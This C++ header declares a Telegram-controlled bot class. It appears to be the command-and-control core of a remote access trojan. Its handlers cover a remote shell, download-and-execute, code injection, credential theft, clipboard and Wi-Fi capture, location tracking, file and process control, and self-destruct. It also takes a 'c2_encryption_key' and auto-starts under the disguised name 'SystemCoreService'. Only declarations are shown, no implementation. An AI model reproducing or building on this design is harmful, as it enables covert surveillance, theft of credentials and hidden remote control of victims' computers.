#pragma once

#include <atomic>
#include <memory>
#include <string>
#include <thread>

#include "domain/entities/Admin.hpp"
#include "domain/common/AuditLogger.hpp"
#include "infrastructure/telegram/TelegramReporter.hpp"
#include "infrastructure/telegram/HeartbeatService.hpp"

namespace nuub::application::commands {
    class CommandHandler;
    class MediaHandler;
    class LocationHandler;
    class ShellHandler;
    class SysInfoHandler;
    class ClipboardHandler;
    class ProcessHandler;
    class WifiHandler;
    class FileManagerHandler;
    class DownloadExecHandler;
    class KeywordAlertHandler;
    class InjectHandler;
    class SelfDestructHandler;
    class CredentialHandler;
}

namespace nuub::infrastructure::telegram {

class TelegramBot final {
    std::string token_;
    domain::entities::Admin admin_;
    std::string pc_id_;
    TelegramReporter reporter_;
    HeartbeatService heartbeat_;
    std::unique_ptr<domain::AuditLogger> audit_;

    application::commands::CommandHandler* cmd_handler_ = nullptr;
    application::commands::MediaHandler* media_handler_ = nullptr;
    application::commands::LocationHandler* loc_handler_ = nullptr;
    application::commands::ShellHandler* shell_handler_ = nullptr;
    application::commands::SysInfoHandler* sysinfo_handler_ = nullptr;
    application::commands::ClipboardHandler* clipboard_handler_ = nullptr;
    application::commands::ProcessHandler* process_handler_ = nullptr;
    application::commands::WifiHandler* wifi_handler_ = nullptr;
    application::commands::FileManagerHandler* filemgr_handler_ = nullptr;
    application::commands::DownloadExecHandler* dl_handler_ = nullptr;
    application::commands::KeywordAlertHandler* alert_handler_ = nullptr;
    application::commands::InjectHandler* inject_handler_ = nullptr;
    application::commands::SelfDestructHandler* uninstall_handler_ = nullptr;
    application::commands::CredentialHandler* credential_handler_ = nullptr;

    std::atomic<bool> running_{false};
    std::thread poll_thread_;
    std::int64_t last_update_id_ = 0;
    std::string config_path_ = "config.json";
    std::string auto_start_name_ = "SystemCoreService";

    void poll_loop();
    void dispatch(std::int64_t chat_id, const std::string& command,
                  const std::string& target, int duration, const std::string& extra);
    std::string api_call(const std::string& method, const std::string& params);
    std::string handle_help();

public:
    TelegramBot(std::string token, std::int64_t admin_chat_id, std::string pc_id);
    TelegramBot(std::string token, std::vector<std::int64_t> admin_chat_ids, std::string pc_id);
    TelegramBot(std::string token, std::vector<std::int64_t> admin_chat_ids,
                std::string pc_id, const std::string& c2_encryption_key);
    TelegramBot(std::string token, domain::entities::Admin admin,
                std::string pc_id, const std::string& c2_encryption_key = "");
    ~TelegramBot();

    void set_handlers(
        application::commands::CommandHandler& cmd,
        application::commands::MediaHandler& media,
        application::commands::LocationHandler& loc,
        application::commands::ShellHandler& shell,
        application::commands::SysInfoHandler& sysinfo,
        application::commands::ClipboardHandler& clipboard,
        application::commands::ProcessHandler& process,
        application::commands::WifiHandler& wifi,
        application::commands::FileManagerHandler& filemgr,
        application::commands::DownloadExecHandler& dl,
        application::commands::KeywordAlertHandler& alert,
        application::commands::InjectHandler& inject,
        application::commands::SelfDestructHandler& uninstall,
        application::commands::CredentialHandler& credential);

    void set_audit_log(const std::string& path);
    void set_config_path(const std::string& path) { config_path_ = path; }
    void set_auto_start_name(const std::string& name) { auto_start_name_ = name; }

    void start();
    void stop();

    TelegramReporter& reporter() { return reporter_; }
    domain::entities::Admin& admin() { return admin_; }
};

} // namespace nuub::infrastructure::telegram
